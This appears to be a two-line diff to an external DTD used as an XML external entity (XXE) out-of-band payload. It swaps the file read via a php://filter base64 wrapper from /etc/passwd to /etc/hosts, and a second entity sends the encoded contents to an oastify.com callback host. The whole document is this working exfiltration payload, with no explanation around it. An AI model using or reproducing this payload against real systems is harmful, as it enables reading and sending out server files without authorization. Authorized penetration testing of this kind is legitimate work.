@@ -1,2 +1,2 @@
-<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/hosts">
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'http://jg3bov7bbpq0yus5zgqj6ioz8qeh28qx.oastify.com/endpoint.php?a=%d;'>">
